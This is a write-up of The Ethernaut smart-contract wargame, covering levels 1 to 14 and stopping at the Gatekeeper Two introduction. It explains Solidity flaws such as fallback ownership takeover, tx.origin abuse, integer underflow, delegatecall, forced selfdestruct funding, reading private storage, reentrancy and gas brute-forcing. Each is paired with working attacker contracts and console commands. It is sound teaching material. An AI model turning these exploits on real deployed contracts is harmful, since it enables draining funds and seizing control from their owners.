---
title: The Ethernaut CTF Writeup
date: 2022-12-08
categories: [writeup,ethernaut]
tags: [writeup,ethernaut] #always lowercase
---

This is a write-up for The Ethernaut CTF collection of challenges. The Ethernaut is a Web3/Solidity based wargame played in the Ethereum Virtual Machine. Each level is a smart contract that needs to be 'hacked'.

## 1. Hello Ethernaut 🙌🏻
> This level walks you through the very basics of how to play the game.

This level exposes the basics in order to play the Ethernaut. `contract.info()` returns info from the 
contract. We receive: 'You will find what you need in info1().' `contract.info1()` returns 'Try info2(), but with "hello" as a parameter.' We already see a pattern where info methods will return instructions for nexts steps. In security, we need to be fast and work smart, not hard. We can use `contract.methods`, which returns all the methods for the contract. After checking all contract methods, see the `password()` method and the `authenticate()` method (which takes a string as param). We deduce that `password()` will return the parameter needed to authenticate ourselves via `authenticate()`. So we first run `password()`, which returns ethernaut0. We then call `authenticate()` with ethernaut0 as param and... voilà!  

1st Ethernaut level completed ✅

## 2. Fallback 💰
> Look carefully at the contract's code below.
> You will beat this level if
> - you claim ownership of the contract
> - you reduce its balance to 0  
> 
> Things that might help: 
> - How to send ether when interacting with an ABI
> - How to send ether outside of the ABI
> - Converting to and from wei/ether units (see help() command)
> - Fallback methods

The second Ethernaut level consists in a contract that allows users to make contributions through `contribute()`. We can see in the `contribute()` method that if the contribution is higher than the highest contribution, we'll become the new contract owner.
``` solidity
function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```
The contract has an initial owner which is set in the constructor, and only the owner is allowed to withdraw all the contract's funds via `withdraw()` (which has the well-known `onlyOwner` modifier):
``` solidity
function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
}
```
We could become the owners by contributing more than the highest contribution, but this is a pretty high contribution done by the initial owner in the constructor (1000 ether), so we'll have to break the contract😈:
``` solidity
constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

```

We see that contract has a `receive()` method, which allows changing the owner of the contract just by sending an amount of ether higher than 0 if we have at least a contribution higher than 0:
``` solidity
receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
````
In Solidity, fallback functions `receive()` and `fallback()` are used in two different ways: 
- `receive()`: contract received ether and no data. If `receive()` does not exist in the contract, `fallback()` will be triggered. Forced to be `payable`.
- `fallback()`: contract received data but no function matched the function called, or contract received ether but no `receive()` function was found. Optionally `payable`.

Here's an easy diagram to better understand how receive and fallback work:
![diagram](https://github.com/0xadrii/0xadrii.github.io/blob/main/images/fallback_receive.png)

Knowing this, we can contribute a small amount of ether via `contribute()` in order to bypass the `contributions[msg.sender] > 0` check:
```javascript
await contract.contribute({value: toWei('0.000000000001')});
```
If we check the owner via `contract.owner()` we see that it still is 0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F. We still need to send the ether to trigger the receive() function.
We can do this just by sending some ether directly to the contract, and like this we can become the owner and then withdraw all contract's ether:
 
```javascript
await contract.send(toWei('0.000000000001'))
```

We'll see we are the owners now. The requirements for completing the level were becoming owners and draining the contract. Being the owners, we can directly call `withdraw()` and become the contract's owners.

```javascript
await contract.withdraw();
```
2nd Ethernaut level completed ✅


## 3. Fallout 1️⃣
> Claim ownership of the contract below to complete this level.
> Things that might help
> - Solidity Remix IDE

This level is just looking to confuse us by making us believe that the `Fal1out()` function is the constructor of the contract:
```solidity
/* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }
```
Prior to version 0.4.22 of Solidity, constructors were defined as functions with the same name as the contract. We could think that this is the case for this contract, but two things make us detect that this is not the case:
- The version of the contract is ^0.6.0, so constructor can only be defined with the `constructor()` keyword 
- The name of the function commented as "constructor" is Fal1out (it has a number 1 instead of an L), so the name of the contract is not the same as the function. Even if the contract's version was one prior to 0.4.22, this function would not work as constructor because the name of the contract and the function name are different. 

In order to claim ownership of the contract, we just need to call the `Fal1out()` function:
```javascript
await contract.Fal1out({value: toWei("0.00000001")})
```
This level is a quckly reminder of how important it is to be fully focused and don't let ourselves be guided by comments when auditing code.

3rd Ethernaut level completed ✅

## 4. Coin Flip 🪙
>This is a coin flipping game where you need to build up your winning streak by guessing the outcome of a coin flip. To complete this level you'll need to use your psychic abilities to guess the correct outcome 10 times in a row.
> Things that might help
> - See the Help page above, section "Beyond the console"

In this challenge, we need to flip the coin 10 times and guess the correct side 10 out of 10 times in order to pass the level:
``` solidity
function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue / FACTOR;
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
```
Things to consider: 
- We can't trigger the `flip()` function 10 times in the same block due to the first check of the function ensuring that the current `blockValue` is different from the previously stored one.
- If we guess correctly, `consecutiveWins` will increase for us, otherwise it'll be reset

This function tries to leverage `block.value` in order to create a kind of randomness. In reality, this is not completely random, because Solidity contracts are deterministic. We can anticipate the CoinFlip contract's results and use this information to exploit it. In this case, we can easily detect which will be the value to pass to the function by creating a contract that performs the same exact calculations that the `flip()` function carries out, and then call `flip()` in the same transaction with the boolean value obtained from doing said calculations. We can build a simple contract in remix to do this:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
interface ICoinFlip {
    function flip(bool _guess) external returns (bool);
}
contract Attacker {

    ICoinFlip public immutable iCoinFlip;

    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    
    constructor(address _coinFlip) {
        iCoinFlip = ICoinFlip(_coinFlip);
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        iCoinFlip.flip(side);
    }
}
```

Then, we can call `attack()` 10 times (making sure we call it in a different block from the one in the previous transaction) and we'll flip the coin correctly 10 straigth times! We could also automate this using ethers.js and looping for 10 times, interacting with the contract every time a block is added to the blockchain to surpass the contract's block check.
4th Ethernaut level completed ✅

## 5. Telephone 📞
> Claim ownership of the contract below to complete this level.
> Things that might help
> - See the Help page above, section "Beyond the console"

In order to complete this level, we need to claim ownership of the contract. We can do this by calling the 'changeOwner()' method:

```solidity
function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
```
As we can see, in order to become the owner, `tx.origin` must be different from `msg.sender`. What is the difference between them? As [this O'Reilly post describes](https://www.oreilly.com/library/view/solidity-programming-essentials/9781788831383/3d3147d9-f79f-4a0e-8c9f-befee5897083.xhtml), the `tx.origin` global variable refers to the original external account that started the transaction while `msg.sender` refers to the immediate account (it could be external or another contract account) that invokes the function. 

Knowing this, we reach the conclusion that in order to change the contract ownership, we need to call the 'changeOwner()' from a contract. We can create a simple contract to do so:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
interface ITelephone {
    function changeOwner(address _owner) external;
}
contract Attacker {
    ITelephone public immutable iTelephone;

    constructor(address _telephone) {
        iTelephone = ITelephone(_telephone);
    }

    function attack() external {
        iTelephone.changeOwner(msg.sender);
    }
}
```
This way, tx.origin will be our EOA account, while msg.sender will be our newly crafted contract's account.

5th Ethernaut level completed ✅
## 6. Token 💎
> The goal of this level is for you to hack the basic token contract below.
>
> You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.
>
> Things that might help:
>
> - What is an odometer?

This level consists of a token contract we need to hack. We start with 20 tokens, and we'll pass the level if we are able to obtain more tokens. 

Checking the contract, the only way to obtain more tokens is via the `transfer()` function:
```solidity
function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }
```

The contract tracks how many tokens each user has using the `balances` mapping. The `transfer()` function decreases the value to transfer from `msg.sender` balance, and adds it to the receiver address.

The "What is an odometer" level hint makes us think of the solidity underflow vulnerability. An underflow is a situation when uint (unsigned integer) reaches its minimum byte size. Imagine we have a 1 byte (8 bits) variable. When it's set to 0, its value will be 0 (00000000 in bits). If we try to decrease just 1 from there, next value won't be -1, but 255 (11111111 in bits), because it underflows just like an odometer would do. 

In Solidity versions equal or higher to 0.8, this issue is handled by Solidity itself by reverting when an underflow or overflow occurs. In this particular level, Solidity version  is ^0.6.0, so Solidity won't revert on underflow and we can try to make our inicial 20 token balance (0000..00010100) become the maximum available value in 256 bits (1111....11111111) by substracting 21 tokens from our balance by using `transfer()` function, and cause an underflow. Because `balances[msg.sender] - _value` will become 256, we can surpass the first check in the function, and end up having the maximum possible token balance. So we end up doing a simple transfer to a random address:

```javascript
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```

6th Ethernaut level completed ✅

## 7. Delegation 🚪
> The goal of this level is for you to claim ownership of the instance you are given.
>
>Things that might help
>
> - Look into Solidity's documentation on the delegatecall low level function, how it works, how it can be used to delegate operations to on-chain libraries, and what implications it has on execution scope.
> - Fallback methods
> - Method ids

Claiming ownership again, this time delegatecalling! In this level, we have to contracts:
- Delegate contract: a contract just having an owner variable and a `pwn()` method, which sets the contract owner to msg.sender
- Delegation: a contract with a fallback function delegatecalling to the Delegate contract address

In order to claim ownership of the Delegation contract, we need to understand what `delegatecall` is. In Solidity, `delegatecall` allows the caller contract to execute the callee's logic in the caller's contract context. If contract A delegatecalls to contract B, contract A's storage will be affected by executing contract B's logic. In our case, we see that Delegation contract (contract A) delegatecalls to Delegate contract (contract B). This means we can execute the `pwn()` function from Delegate contract in Delegation's contract context, thus setting Delegation's owner to be ourselves (msg.sender).  
> (Note: because owner variables are stored in slot 0 of both Delegation and Delegate contracts, this approach will work for us. This is due to how storage works in Solidity, but NOT due to the variable names. If owner variables where placed in different slots on both contracts, this approach would not work. You can learn more about Solidity storage in the [Solidity official documentation](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html)).

If you remember the fallback Ethernaut level, the fallback function is a special function executed when contract received data but no function matched the function called. Checking the code we are provided with, if the fallback function is executed in the Delegation contract, it will forward the `msg.data` (the data referencing function we want to call) to Delegate contract:
``` solidity
fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
```

We reach the conclusion that what we want to do here is to call the `pwn()` function to Delegation contract. This will trigger the fallback function, which will delegatecall `pwn()` as `msg.data` to Delegate contract, thus changing our Delegation owner storage variable to `msg.sender`. We can do this in the Ethernaut's browser console just like this:
```javascript
await contract.sendTransaction({data: "0xdd365b8b"});
``` 
> Note: We are using the `pwn()` function selector for easiness in the Ethernaut console. Function selectors take first 4 bytes of keccak256 of the function selector (in our case, we use keccak256("pwn()") first 4 bytes, which is 0xdd365b8b). You can read more about function selectors [here](https://solidity-by-example.org/function-selector/).

7th Ethernaut level completed ✅

## 8. Force 🛣
> Some contracts will simply not take your money ¯\_(ツ)_/¯
> The goal of this level is to make the balance of the contract greater than zero.
> Things that might help:
>
> - Fallback methods
> - Sometimes the best way to attack a contract is with another contract.
> - See the Help page above, section "Beyond the console"

In this level, we see an empty contract which we need to increase the balance of. As we previously learnt, in order to send funds to a contract it must have a `receive()` or `fallback()` method. How can we approach this if this contract has none of them?
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```
The only way to force sending funds to a contract that can't receive ether is via `selfdestruct()`. Selfdestruct method will destroy the contract executing it, and will send all the contract's funds to the address specified as parameter. Knowing this, we can create a contract, send it some ether and selfdestruct it, passing the Force contract address as the funds receiver. This way, we'll increase the balance of Fund contract without it requiring `receive()` nor `fallback()`. An example contract to do so would be:
``` solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Attacker {

    function attack(address payable receiver) external {
        selfdestruct(receiver);
    }
    // Allow receiving ether
    receive() external payable{

    }
}
```
And we're done! Triggering `attack()` will send Attacker contract's funds to Force contract and make us pass the level!

8th Ethernaut level completed ✅

## 9. Vault 🏦
> Unlock the vault to pass the level!

In order to pass this level, we need to trigger the `unlock()` function succesfully. It requires a password which initially we don't know:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```
The password passed as parameter must be equal to the `password` variable, which is private and its value is set on the constructor. We could think that the fact that `password` variable is private won't allow us to read its value. This is not true. Any contract code deployed to the blockchain can be read/viewed by anyone. In this case, the constructor sets the password value, so even if `password` is private we'll be able to read it because of this "everything is public" blockchain characteristic.  

Password is stored in storage slot 1, so in order to read its value we just need to use cast's tool to [read storage variables through the cli](https://book.getfoundry.sh/reference/cast/cast-storage). We need to pass an address, storage slot and rpc url to read the storage slot value. As easy as that!
```bash
cast storage 0xDD381622461EAbba4906a767123f6460C328f806 1 --rpc-url YOUR_RPC_URL
```
After running the command, we see the result for the password is 0x412076657279207374726f6e67207365637265742070617373776f7264203a29 . We can now trigger `unlock` and pass this ass parameter to unlock the contract!
``` javascript
await contract.unlock("0x412076657279207374726f6e67207365637265742070617373776f7264203a29")
```
9th Ethernaut level completed ✅

## 10. King 👑
>The contract below represents a very simple game: whoever sends it an amount of ether that is larger than the current prize becomes the new king. On such an event, the overthrown king gets paid the new prize, making a bit of ether in the process! As ponzi as it gets xD
>
>Such a fun game. Your goal is to break it.
>
>When you submit the instance back to the level, the level is going to reclaim kingship. You will beat the level if you can avoid such a self proclamation.

As the level introduction says, our goal for this level is to avoid the contract to reclaim kingship of the level when we submit the instance. The level will try to trigger the `receive()` function when we submit the instance, and we need make that transaction revert. 

The `receive()` function will first check that the `msg.value` is higher than the current prize (it also has the `msg.sender == owner` in order to allow the level instance to reclaim kingship via the receive function without having to send funds, because owner is set to the level instance address in the constructor). After that, the transaction value will be transferred to the previous king, the new king will be set to `msg.sender`, and `msg.value` will be the new prize. 

As we have learnt in the past levels, transfers of ether are handled by contracts via `receive()` and `fallback()` functions. Because we want the level to never be able to reclaim kingship when we submit the instance, we could reclaim kingship first with a contract that reverts always when receiving funds. We can easily do this by setting up a contract that always reverts when triggering its fallback function. An example of such a contract could be:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

contract Attacker {

    function attack(address receiver) external  payable{
        (bool success, ) = receiver.call{value: msg.value}("");
        require(success, "KINGSHIP NOT CLAIMED");
    }
    // Allow receiving ether
    receive() external payable{
        revert();
    }
}
```

What we do is first call the attack function passing a value higher than the current prize set in the King contract. This way, we'll become the king. Then, every trigger on the `receive()` function in the King contract will revert, because our Attacker contract is built so that it will revert with KINGSHIP NOT CLAIMED reason string each time it receives ether. Kind of a tricky game, but pretty fun!

10th Ethernaut level completed ✅

## 11. Reentrancy 🏃🏼
>The goal of this level is for you to steal all the funds from the contract.
> Things that might help:
> - Untrusted contracts can execute code where you least expect it.
> - Fallback methods
> - Throw/revert bubbling
> - Sometimes the best way to attack a contract is with another contract.
> - See the Help page above, section "Beyond the console"

This level exposes a typical reentrancy vulnerability. Reentrancy takes place when we can call a function again before its previous execution has finished. In this level, the main issue is found on withdraw (pretty common issue found in a lot of protocols):
```solidity
function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }
```

As we can see, if `msg.sender` has enough balance, the `withdraw()` function will first transfer the amount specified by parameter to `msg.sender`, and then `msg.sender` balance will be decreased after sending the amount. The issue here is the order of events, as this piece of code is not following the Checks-Effects-Interactions pattern. The check-effects-interactions pattern states the correct order of events in any contract interaction:
1. Checks: Is the input acceptable? If not, then either "Fail Early and fail hard" or return false.
2. Effects: Update the contract to a new state
3. Interactions: Perform any `.send()`, `.transfer()` and `.call()` as well as function calls to "untrusted" contracts.

In the specific case of our `withdraw()` function, Checks would be checking that `msg.sender` has enough balance, Effects would be decreasing the `balances` mapping, and Interactions would be sending ether to `msg.sender`. The code from this level correcty performs Checks in the beginning, but as we can see it then triggers Interactions prior to Effects (it transfers ether before decreasing the `balances` mapping). How to take advantage of this issue? 

As we've seen, reentrancy consists of executing a function before finishing its previous execution. We could call `withdraw()`, and when it transfers ether to `msg.sender` (which in this case will be our malicious contract) we could call `withdraw()` again. Because `balance` mapping is not decreased before triggering `withdraw()` again, we'll surpass the `balances[msg.sender] >= _amount` check infinitely, until the contract is completely drained.

Our attacker contract could be something like this:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;

interface IReentrance {
    function withdraw(uint256 _amount) external;
}

contract Attacker {
    IReentrance public immutable iReentrance;
    constructor(address reentrance) {
        iReentrance = IReentrance(reentrance);
    }
    function attack() public payable {
        iReentrance.withdraw(msg.value);
    }
    // Allow receiving ether
    receive() external payable{ 
        iReentrance.withdraw(msg.value);
    }
}
```

So we'll first deposit to the contract via `donate()` passing our attacker contract address as receiver in parameter, in order to at least have a minimum balance to surpass the first check in `withdraw()`:
```javascript
await contract.donate('0x72dAe46302cB146526207A1ED76eb509F70C76D5', {value: toWei('0.001')})
```
After that, all is left to the magical `receive()` function inside our contract. Considering the contract balance initially is 0.001 ether, if we call `attack()` in our contract passing 0.001 as `msg.value`, `withdraw()` will be triggered with 0.001 as amount parameter. In total, we'll need two reentrant iterations to drain the contract. You can check [my transaction](https://goerli.etherscan.io/tx/0xa5bee70bac82775511bafd37ce4db2d18696060f23c29b783378fad988886419) on goerli to see the reentrant internal txns. And thats all, contract drained! How malicious of us!🤓 

11th Ethernaut level completed ✅

## 12. Elevator 🛗
> This elevator won't let you reach the top of your building. Right?
> Things that might help:
> - Sometimes solidity is not good at keeping promises.
> - This `Elevator` expects to be used from a `Building`.

This level can be a little tricky in the beginning. We have the `goTo()` function, which represents moving to an Elevator floor. Our goal here is to reach the last floor of the building (or in other words, make the `top` variable become true when we call `goTo()`).
Let's take a look at`goTo()`:

```solidity
function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
```
As we can see, the function receives the floor number we want to go to. The Elevator contract interacts with a Building contract (which we will be deploying) in order to check if the floor we want to fo to is the last one. There are two situations:
- The floor we want to go to is the last floor: in that case, the `! building.isLastFloor(_floor)` condition will be false (negative of true is false), so the block of code inside the if will never be executed
- The floor we want to go to is NOT the last floor:in that case, the `! building.isLastFloor(_floor)` condition will be true (negative of false is true), so the `floor` from the Elevator contract will be set to the floor we passed as parameter, and the `top` boolean (which we want to set to true) will be set to `building.isLastFloor(floor)`, which in our case is false so we won't be able to accomplish the level goal. 

As we can see, if `isLastFloor(_floor)` returns true we won't be able to set the `top` variable, but if `isLastFloor(_floor)` returns false the `top` variable will be set to false!  

The only possible way to tackle this issue is by making the `isLastFloor(_floor)` function not return the same deterministic value always for a given floor. In particular, we first want it to return `false` in order to be able to execute the code inside the if statement in the Elevator contract, and then we want it to return `true` because it is the value we want to be set in the `top` variable. In order to do this, we can create a malicious contract that toggles a boolean variable we return in `isLastFloor(_floor)`. The first time the `isLastFloor()` function from our malicious contract is called, it will return false. Then, it will return true, and so on and so forth. It will always return alternate boolean values. This is how our malicious contract looks:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
interface IElevator {
    function goTo(uint _floor) external;
}

contract Building {
    bool public _isLastFloor;
    IElevator elevator;

    constructor(address _elevator) {
        _isLastFloor = true;
        elevator = IElevator(_elevator);
    }

    function isLastFloor(uint256 _floor) external returns (bool) {
        _isLastFloor = !_isLastFloor;
        return _isLastFloor;
    }

    function goTo(uint256 _floor) external {
        elevator.goTo(_floor);
    }
}
```

After calling the `goTo()` function in our malicious contract, the `goTo()` funtion from the Elevator will be triggered, and we will be able to set `top` to true!

12th Ethernaut level completed ✅


## 13. Privacy 🥷🏻
> The creator of this contract was careful enough to protect the sensitive areas of its storage.
>
> Unlock this contract to beat the level.
>
> Things that might help:
>
> - Understanding how storage works
> - Understanding how parameter parsing works
> - Understanding how casting works
> Tips:
>
> - Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own > web3 provider.

In order to surpass this level, we need to unlock the contract, setting the `locked` variable to false. This can be done calling the `unlock()` function, where we pass a 16-byte key as parameter, and it needs to be equal to `bytes16(data[2])`. Just as the first level indications state, it is really important for this level to understand how storage works in solidity. (I recommend checking [Solidity's official documentation](https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html) to understand storage better). Knowing this, let's get to work!  

The contract has some variables declared in the beginning. Most of them are just bothering us, because in order to unlock the contract we just need the `data` array. We first want to know what value is stored in `data[2]`, but it is a private variable. We'll do the same we did in the Vault level, where we learnt that even if a variable is private we can access its data by reading directly from the storage. So we first need to determine the storage slot of `data[2]`:
```solidity
  bool public locked = true; //SLOT 0
  uint256 public ID = block.timestamp; //SLOT 1
  uint8 private flattening = 10; //SLOT 2
  uint8 private denomination = 255; //SLOT 2
  uint16 private awkwardness = uint16(block.timestamp); //SLOT 2
  bytes32[3] private data; // data[0] -> SLOT 3, data[1] -> SLOT 4, data[2] -> SLOT 5
```

As we can see, `data[2]` is stored in slot 5. This is because `flattening`, `denomination`, and `awkwardness` are packed in the same slot (slot 2) due to their byte length, and because fixed-sized arrays like `data` store their data in contiguous storage slots.  

Now that we know what `data[2]`'s slot is, we can access it using `cast`:

``` bash
cast storage 0xb7e7fa9Aaca3496e0a57E248d5a5B1ACf23009c5 5 --rpc-url YOUR_RPC_URL
```
After executing the command, we know that the value stored for `data[2]` is 0x2595c375b22b22265e0a4cb1c5abafc56750d67e1e044ece3c49db65de046921.

The last thing we need to do is understand is how casting works in solidity, because we have the full 32-byte value stored in `data[2]` but the `unlock()` function checks whether the `_key` we pass as parameter is equal to `bytes16(data[2])`:
```solidity
function unlock(bytes16 _key) public {
  require(_key == bytes16(data[2]));
  locked = false;
}
```
I can't recommend enough [this amazing writeup](https://betterprogramming.pub/solidity-tutorial-all-about-conversion-661130eb8bec) on type-casting, done by [Jean Cvllr](https://github.com/CJ42). This article explains all kinds of conversions between solidity types, as well as the difference between implicit and explicit conversions. In order to surpass this level, I recommend reading the Conversion between bytesN section.  

Basically, converting to a smaller bytes range will discard the right-most bytes. In our case, we are converting from `bytes32` to `bytes16`, so the right-most 16 bytes (32 bytes from the original data[2] - 16 bytes from the cast) will be removed:

```solidity
// Initial data[2] value: 
0x2595c375b22b22265e0a4cb1c5abafc56750d67e1e044ece3c49db65de046921

// bytes16(data[2]) (discarding the right-most 16 bytes)
0x2595c375b22b22265e0a4cb1c5abafc5
```

We found the key! Now we only need to call the `unlock()` function passing the 0x2595c375b22b22265e0a4cb1c5abafc5 value as the key and the contract will be unlocked! 
``` javascript
  await contract.unlock("0x2595c375b22b22265e0a4cb1c5abafc5");
```

Congrats, you just stepped up your Solidity game!😎

13th Ethernaut level completed ✅

## 14. Gatekeeper One 🚧

> Make it past the gatekeeper and register as an entrant to pass this level.
>
> Things that might help:
> - Remember what you've learned from the Telephone and Token levels.
> - You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).

The goal for this level is to register as an entrant using the `enter()` function. This function just sets `tx.origin` as the entrant (pretty innocent tbh), but it has three modifiers controlling its access. We must surpass these modifiers in order to successfully enter the function and register ourselves as an entrant.
```solidity
function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
```

We'll go through the gates one by one:
- `gateOne()`:
```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }
```
`gateOne()` is just checking whether `msg.sender` is different from `tx.origin`. We already learnt the differences between them in the Telephone level, so we reach the conclusion that in order to surpass this first modifier we'll just need to call the `enter()` function from a contract crafted by ourselves, rather than directly from our EOA.

- `gateTwo()`:
```solidity
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }
```
This second modifier checks whether module between `gasLeft()` and 8191 is equal to 0. `gasLeft()` just returns the remaining available gas for the function to run successfully. In solidity, gas used is computed based on the OPCODES used for that code (check [evm.codes](https://www.evm.codes/)). It can even change a bit depending on the compiler version we are using for the code we want to execute, so it would be pretty hard to try to guess the exact value that allows us to surpass the `gasleft() % 8191 == 0` check. The most viable solution in this case is to follow [CMichel's Ethernaut Solution](https://cmichel.io/ethernaut-solutions/) and brute-force it. The attack function in our malicious contract would look something like this:
```solidity
  function attack(bytes8 _gateKey, uint256 gasToUse) external {
      for (uint256 i = 0; i <= 8191; i++) {
          try gatekeeperOne.enter{gas: gasToUse}(_gateKey) {
              break;
          } catch {}
      }
  }   
```

- `gateThree()`:
```solidity
 modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }
```
`gateThree()` is a combination of type casts (the previous level was a good training for this one). Looking at the three requires, we first see that the only one allowing us to predict a value for `_gateKey` is the third one, because it is playing around with `tx.origin`. 
  - `require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)))` 

  The right side of the comparison is first casting `tx.origin` to 160 bits. Because addresses in Solidity are 20 Bytes large (or 160 bits) and `tx.origin` is an address, the first type cast to 160 bits won't affect us. We then have a type cast to a smaller uint number (160 bits to 16 bits cast). In Solidity, converting an unsigned integer to a smaller type will result in the left-most bits (or the Most Significant Bits) being discarded. So the result for the right side cast will be:
  ```solidity
  // tx. origin
  0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1 // @note: change it for the address you'll use as `tx.origin`

  // uint160(tx.origin)
  0x28D9F73D4Ce4ce594b2B231714b03139ad74F3C1 // as we saw, it'll remain the same

  // uint16(uint160(tx.origin))
  0xF3C1 // 144 left-most bits get discarded (160 bits - 16 bits = 144 bits)
  ```

  The left side of the comparison is first casting the `_gateKey` (which is 8 bytes long, or 64 bits) to 64 bits, so the first conversion won't affect us. Then, it casts the result again to 32 bits. If we want the left side to be equal to the right side, uint32(uint64(_gateKey)) should be equal to 0xF3C1 (as we discovered above). I recommend going through the process of casting and the output step by step, and see how adding zeroes in the middle of our `_gateKey`  value can make it be the same as the value we found earlier:
  ```solidity
  // initial value we could have derived from `tx.origin`
  0x14b03139ad74F3C1
  // _gateKey
  0x14b031390000F3C1 // 8 bytes, or 64 bits. Replace middle four bytes with zeroes

  // uint64(_gateKey)
  0x14b031390000F3C1 // as we saw, it'll remain the same 64 bits

  // uint32(uint64(_gateKey))
  0x0000F3C1 // 32 left-most bits get discarded (64 bits - 32 bits = 32 bits). 0x0000F3C1 is the same as 0xF3C1 (left zeroes don't affect the actual value), so third require surpassed🙌🏻 
  ```
  In my case, I reached the conclusion of where to put the middle zeroes by going through the process step by step, checking what happened to the bytes.

  Let's now check the first require:
  - `require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)))`

  The left side of this comparison is the same as the require we checked before, so we know _gateKey will be 0x14b03139ad74F3C1, and the resulting value after casting will be 0x0000F3C1. If we perform the right side of the comparison:
  ```solidity
  // _gateKey (obtained from previous reasoning about the third require)
  0x14b031390000F3C1 // 8 bytes, or 64 bits. 
  
  // uint64(_gateKey)
  0x14b031390000F3C1 // as we saw, it'll remain the same 64 bits

  // uint16(uint64(_gateKey))
  0xF3C1 // 48 left-most bits get discarded (64 bits - 16 bits = 48 bits). 
  ```

  0x0000F3C1 is the same as 0xF3C1 (left zeroes don't affect the actual value), so first require surpassed🙌🏻

  At this point we can imagine that the `_gateKey` value we have found is correct, but let's check the second require to confirm:
  - `require(uint32(uint64(_gateKey)) != uint64(_gateKey))`
  The left side of this comparison is the same as the require we checked before, so we know _gateKey will be 0x14b03139ad74F3C1. The right side of this comparison will be: 

```solidity
  // _gateKey (obtained from previous reasoning about the third require)
  0x14b031390000F3C1 // 8 bytes, or 64 bits. 
  
  // uint64(_gateKey)
  0x14b031390000F3C1 // as we saw, it'll remain the same 64 bits
```

  0x14b031390000F3C1 is different from 0x14b03139ad74F3C1, so the second require will be succesfully surpassed!

  Gate Key discovered! Our final malicious contract is ready, and we just need to call the `attack` function, passing the gatekey we just discovered (0x14b031390000F3C1 in my case) as parameter in order to become the entrant:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.17;
interface IGatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Attacker {
    IGatekeeperOne gatekeeperOne;

    constructor(address _gatekeeperOne) {
        gatekeeperOne = IGatekeeperOne(_gatekeeperOne);
    }

    function attack(bytes8 _gateKey, uint256 gasToUse) external {
        for (uint256 i = 0; i <= 8191; i++) {
            try gatekeeperOne.enter{gas: gasToUse}(_gateKey) {
                break;
            } catch {}
        }
    }   
}
```
14th Ethernaut level completed ✅
## 15. Gatekeeper Two 🚧 🚧

>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.
>
>Things that might help:
> - Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
> - The assembly keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See here for more information. The extcodesize call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the yellow paper.
> - The ^ character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see here). The Coin Flip level is also a good place to start > when approaching this challenge.

